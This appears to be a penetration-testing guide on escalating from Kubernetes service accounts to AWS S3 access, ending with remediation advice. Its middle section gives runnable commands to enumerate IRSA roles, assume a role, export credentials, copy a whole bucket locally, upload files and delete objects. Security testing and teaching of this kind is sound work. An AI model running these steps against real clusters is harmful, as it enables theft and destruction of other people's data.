# Cloud Storage Bucket Access Escalation in Kubernetes

## 1. Overview

### Attack Vector Description

An attacker gains unauthorized access to cloud storage buckets associated with a Kubernetes cluster by escalating their privileges within the cluster. This typically involves exploiting misconfigured roles, service accounts, or IAM policies that allow an attacker to assume a role with broader permissions than intended. The attacker can then use the compromised identity to access and manipulate data stored in the cloud storage bucket.

### Potential Impact and Consequences

*   **Data Breach:** Exposure of sensitive data stored in the bucket, including customer data, proprietary code, or confidential business information.
*   **Data Modification/Deletion:** Corruption or destruction of data within the bucket, leading to service disruption or data loss.
*   **Financial Loss:** Costs associated with data recovery, breach notification, regulatory fines, and reputational damage.
*   **Compliance Violations:** Failure to comply with data privacy regulations (e.g., GDPR, HIPAA).
*   **Lateral Movement:** Use the compromised bucket credentials to access other cloud resources or on-premise systems.

### Risk Level Assessment

**Critical** - Due to the potential for significant data loss, service disruption, and financial impact.

### Technical Explanation

This vulnerability arises from several potential misconfigurations:

*   **Overly Permissive Service Accounts:** Kubernetes service accounts are granted excessive IAM permissions, allowing pods running with that service account to access cloud resources they shouldn't.
*   **Insecure IAM Policies:** IAM policies associated with Kubernetes nodes or service accounts grant broad read/write access to cloud storage buckets.
*   **Role-Based Access Control (RBAC) Misconfigurations:**  A user or group within the Kubernetes cluster is granted permissions (e.g., `get`, `list`, `create`, `update`, `delete` secrets, services) allowing them to manipulate or expose secrets containing cloud credentials or impersonate services that have overly permissive cloud access.
*   **Identity Provider (IdP) Misconfiguration:** The IdP used by the Kubernetes cluster to authenticate with the cloud provider is not properly configured, allowing attackers to assume roles with elevated privileges.
*   **Exploitation of Kubernetes Vulnerabilities:** Leveraging known Kubernetes vulnerabilities to gain initial access and subsequently escalate privileges.

### Prerequisites and Conditions Needed

*   **Initial Access:** Attacker has gained some level of access to the Kubernetes cluster. This could be through:
    *   Compromised container.
    *   Compromised service account.
    *   Compromised Kubernetes user credentials.
    *   Exploitation of a Kubernetes service.
*   **Basic Kubernetes Knowledge:** Familiarity with Kubernetes concepts like pods, service accounts, roles, role bindings, and `kubectl`.
*   **Cloud Provider Credentials:** Understanding of how the specific cloud provider (e.g., AWS, GCP, Azure) manages access to cloud storage buckets.
*   **Cloud CLI (e.g., AWS CLI, gcloud CLI, Azure CLI):**  Installed and configured to interact with the cloud provider, likely using the assumed role.
*   **Target Bucket Identified:** The attacker has identified a cloud storage bucket that is potentially vulnerable.

## 2. Validation and Exploitation Steps

This section demonstrates how to validate and exploit cloud storage bucket access escalation, using AWS S3 as the example storage bucket.  Adapt the commands to your specific cloud provider.

**A. Discovery and Validation**

**Step 1: Identify Service Accounts with Cloud Access**

*   **Command:**

```bash
kubectl get serviceaccounts --all-namespaces -o yaml | grep -i "annotations"
```

*   **Explanation:** This command lists all service accounts in all namespaces and filters the output to show lines containing "annotations".  Service accounts with annotations might have cloud-specific IAM roles or policies attached.  For example, AWS IAM Roles for Service Accounts (IRSA) use annotations.
*   **Why:** To identify service accounts that may have been configured to interact with cloud resources.
*   **Expected Output:** A list of service accounts with annotations, often including cloud provider-specific annotations.
*   **Validation:**  Look for annotations that resemble cloud provider IAM roles or policies. For AWS, look for `eks.amazonaws.com/role-arn`.
*   **Alternative Approaches:**  You might need to manually inspect each service account's definition using `kubectl describe serviceaccount <service-account-name> -n <namespace>` if `grep` doesn't yield results.

**Step 2: Inspect the IAM Role Associated with the Service Account (AWS Example)**

*   **Command (Assuming `eks.amazonaws.com/role-arn` annotation is present and contains the role ARN):**

```bash
SERVICE_ACCOUNT_NAME="your-service-account" # Replace with actual service account name
NAMESPACE="your-namespace"  # Replace with actual namespace
ROLE_ARN=$(kubectl get serviceaccount $SERVICE_ACCOUNT_NAME -n $NAMESPACE -o jsonpath='{.metadata.annotations.eks\.amazonaws\.com/role-arn}')
aws iam get-role --role-name $(basename $ROLE_ARN)
```

*   **Explanation:**
    *   The first two lines define variables for the service account name and namespace. Replace the placeholders with the correct values.
    *   The third line retrieves the `eks.amazonaws.com/role-arn` annotation from the service account and stores it in the `ROLE_ARN` variable.  The `jsonpath` is crucial for extracting the annotation value.
    *   The fourth line uses the AWS CLI to retrieve the details of the IAM role specified in the `ROLE_ARN`.  The `basename` command extracts the role name from the ARN.
*   **Why:** To examine the IAM permissions associated with the role assumed by the service account.
*   **Expected Output:** A JSON document containing the details of the IAM role, including its policies.
*   **Validation:** Analyze the `AssumeRolePolicyDocument` and `Policies` to determine if the role has overly permissive access to S3 buckets or other cloud resources.  Look for `s3:*` actions on `Resource: "*"`.
*   **Alternative Approaches:** Use the AWS Management Console or other AWS SDKs to inspect the IAM role.

**Step 3: Attempt to Assume the Role and List S3 Buckets (AWS Example)**

*   **Command:**

```bash
SERVICE_ACCOUNT_NAME="your-service-account" # Replace with actual service account name
NAMESPACE="your-namespace"  # Replace with actual namespace
ROLE_ARN=$(kubectl get serviceaccount $SERVICE_ACCOUNT_NAME -n $NAMESPACE -o jsonpath='{.metadata.annotations.eks\.amazonaws\.com/role-arn}')

# Assume the role (replace <DUMMY_SESSION_NAME> with a descriptive name)
aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "<DUMMY_SESSION_NAME>" > assume_role_output.json

# Extract credentials from the JSON output
AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume_role_output.json)
AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume_role_output.json)
AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume_role_output.json)

# Configure AWS CLI to use the assumed role's credentials
export AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$AWS_SECRET_ACCESS_KEY"
export AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN"

# List S3 buckets (Test Permissions)
aws s3 ls
```

*   **Explanation:**
    *   This command first retrieves the IAM role ARN.
    *   It then uses the AWS CLI to attempt to assume the role associated with the service account.  `sts assume-role` creates a temporary session with the permissions of the specified role.
    *   It extracts the temporary access key, secret key, and session token from the `assume_role_output.json` file using `jq`.  `jq` is a powerful command-line JSON processor.
    *   The temporary credentials are then set as environment variables.
    *   Finally, it attempts to list S3 buckets using the assumed role's credentials.
*   **Why:** To verify that the attacker can successfully assume the role and has sufficient permissions to interact with S3.
*   **Expected Output:**
    *   If the role assumption is successful and the role has S3 `ListBuckets` permission, the command will list all S3 buckets accessible to the role.
    *   If the role assumption is successful but the role lacks S3 `ListBuckets` permission, you will receive an "Access Denied" error. This still indicates that the role has been successfully assumed, and the attacker can try other S3 actions (e.g., `s3 ls s3://<bucket-name>`).
    *   If the role assumption fails, an error message will be displayed.
*   **Validation:**  A successful listing of S3 buckets confirms that the attacker can assume the role and has at least `ListBuckets` permission. An "Access Denied" error still confirms successful role assumption, but with limited permissions, prompting the attacker to try other actions.
*   **Alternative Approaches:** Instead of using the AWS CLI, you could attempt to access S3 buckets programmatically within a container running with the vulnerable service account.

**B. Exploitation**

**Step 4: Enumerate S3 Bucket Contents and Download Sensitive Data**

*   **Command (Assuming you have identified a vulnerable bucket named `your-sensitive-data-bucket`):**

```bash
# List the contents of the S3 bucket
aws s3 ls s3://your-sensitive-data-bucket/

# Download a specific file (replace sensitive_file.txt with the actual file name)
aws s3 cp s3://your-sensitive-data-bucket/sensitive_file.txt .

# Download entire bucket (be careful with very large buckets!)
aws s3 sync s3://your-sensitive-data-bucket/ ./downloaded_bucket/
```

*   **Explanation:**
    *   These commands use the AWS CLI to interact with the S3 bucket.  The `aws s3 ls` command lists the contents of the bucket.
    *   The `aws s3 cp` command copies a specific file from the bucket to the local directory.
    *   The `aws s3 sync` command synchronizes the entire bucket to a local directory.
*   **Why:** To retrieve sensitive data stored in the bucket.
*   **Expected Output:**
    *   A list of files and directories within the S3 bucket.
    *   A copy of the specified file or the entire bucket downloaded to the local directory.
*   **Validation:**  Successful download of sensitive data confirms the vulnerability.
*   **Alternative Approaches:**  Use the AWS Management Console to browse and download data from the bucket.

**Step 5: Modify or Delete Data in the S3 Bucket (If write permissions exist)**

*   **Command (Assuming you have identified write permissions):**

```bash
# Upload a file to the S3 bucket
aws s3 cp malicious_file.txt s3://your-sensitive-data-bucket/malicious_file.txt

# Delete a file from the S3 bucket
aws s3 rm s3://your-sensitive-data-bucket/sensitive_file.txt
```

*   **Explanation:**
    *   These commands use the AWS CLI to modify and delete data in the S3 bucket.  The `aws s3 cp` command uploads a file to the bucket.
    *   The `aws s3 rm` command deletes a file from the bucket.
*   **Why:** To demonstrate the potential for data corruption or service disruption.
*   **Expected Output:**  Successful upload or deletion of the specified file.
*   **Validation:**  Verify that the file has been successfully uploaded or deleted from the bucket.
*   **Alternative Approaches:** Use the AWS Management Console to modify or delete data in the bucket.

**C. Remediation Recommendations**

*   **Least Privilege Principle:**  Grant service accounts only the minimum necessary IAM permissions required to perform their intended functions.
*   **IAM Role Review:** Regularly review and audit IAM roles and policies associated with Kubernetes service accounts.
*   **Use Fine-Grained IAM Policies:** Avoid using wildcard characters (`*`) in IAM policies. Instead, specify the exact resources and actions required.
*   **Kubernetes RBAC:** Implement and enforce strong RBAC policies to control access to Kubernetes resources and prevent unauthorized users from manipulating service accounts.
*   **Principle of Least Privilege for Pods:** Avoid running pods as root unless absolutely necessary.
*   **Pod Security Policies/Pod Security Admission:** Enforce pod security policies or use Pod Security Admission to restrict the capabilities of pods and prevent them from accessing sensitive resources.
*   **Regular Security Audits:** Conduct regular security audits of your Kubernetes cluster and cloud infrastructure.
*   **Use Infrastructure as Code (IaC):**  Use IaC tools to manage your Kubernetes cluster and cloud resources in a consistent and reproducible manner. This reduces the risk of misconfigurations.
*   **Monitor and Alert:** Implement monitoring and alerting to detect suspicious activity in your Kubernetes cluster and cloud environment.  Alert on unusual IAM role assumptions or S3 bucket access patterns.
*   **Credential Rotation:** Implement automated credential rotation for service accounts and other identities used to access cloud resources.
*   **Secrets Management:** Use a secrets management solution (e.g., HashiCorp Vault, AWS Secrets Manager) to securely store and manage secrets and credentials. Avoid storing secrets directly in Kubernetes manifests or environment variables.
*   **Regular Kubernetes Upgrades:**  Keep your Kubernetes cluster up-to-date with the latest security patches.
